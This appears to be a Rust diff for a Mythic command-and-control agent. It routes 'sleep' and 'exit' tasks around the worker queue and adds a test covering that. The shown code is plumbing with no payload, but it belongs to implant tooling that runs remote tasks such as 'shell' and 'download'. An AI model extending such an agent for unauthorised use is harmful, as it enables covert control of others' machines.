@@ -58,6 +58,10 @@ fn dispatch_task(task: mythic::TaskMessage, completed_tx: &Sender<CompletedTask>
     let _ = completed_tx.send(CompletedTask { command, responses });
 }
 
+fn is_control_task(command: &str) -> bool {
+    matches!(command, "sleep" | "exit")
+}
+
 fn start_task_workers(completed_tx: Sender<CompletedTask>) -> Sender<mythic::TaskMessage> {
     let (task_tx, task_rx) = mpsc::channel::<mythic::TaskMessage>();
     let task_rx = Arc::new(Mutex::new(task_rx));
@@ -369,7 +373,7 @@ pub fn run(config: Config) -> MythicResult<()> {
     let mut rng = rand::thread_rng();
     let mut pending: Vec<TaskResponse> = Vec::new();
     let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
-    let task_tx = start_task_workers(completed_tx);
+    let task_tx = start_task_workers(completed_tx.clone());
     let mut next_tasking_at = Instant::now() + next_beacon_delay();
 
     loop {
@@ -411,7 +415,9 @@ pub fn run(config: Config) -> MythicResult<()> {
                     info!("task: {:?}", tasking);
                 }
                 for task in tasking.tasks {
-                    if let Err(e) = task_tx.send(task) {
+                    if is_control_task(&task.command) {
+                        dispatch_task(task, &completed_tx);
+                    } else if let Err(e) = task_tx.send(task) {
                         if DEBUG.load(Ordering::Relaxed) {
                             eprintln!("[!] task worker queue closed: {e}");
                         }
@@ -465,5 +471,13 @@ mod tests {
         }
 
         assert_eq!(received, ids);
+    }
+
+    #[test]
+    fn control_tasks_do_not_use_worker_queue() {
+        assert!(is_control_task("sleep"));
+        assert!(is_control_task("exit"));
+        assert!(!is_control_task("shell"));
+        assert!(!is_control_task("download"));
     }
 }
